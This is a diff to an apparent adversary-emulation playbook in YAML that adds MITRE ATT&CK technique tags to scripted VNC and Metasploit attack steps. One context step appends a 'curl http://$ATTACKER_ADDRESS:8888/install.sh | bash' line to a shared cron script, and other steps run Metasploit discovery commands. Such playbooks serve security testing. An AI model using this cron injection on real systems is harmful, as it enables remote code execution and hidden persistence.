@@ -32,6 +32,9 @@ commands:
       cmd: move
       x: 5
       y: 5
+    metadata:
+      techniques: "T1110"
+      tactics: "Credential Access"
 
   - type: vnc
     session: foothold
@@ -75,6 +78,9 @@ commands:
     session: foothold
     cmd: type
     input: echo "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash" >> /media/share/healthcheck_cron.sh
+    metadata:
+      techniques: "T1105,T1059,T1564"
+      tactics: "Execution, Defense Evasion"
 
   - type: sleep
     seconds: 2
@@ -122,10 +128,16 @@ commands:
   - type: msf-session
     session: movement
     cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
 
   - type: msf-session
     session: movement
     cmd: getuid
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: movement
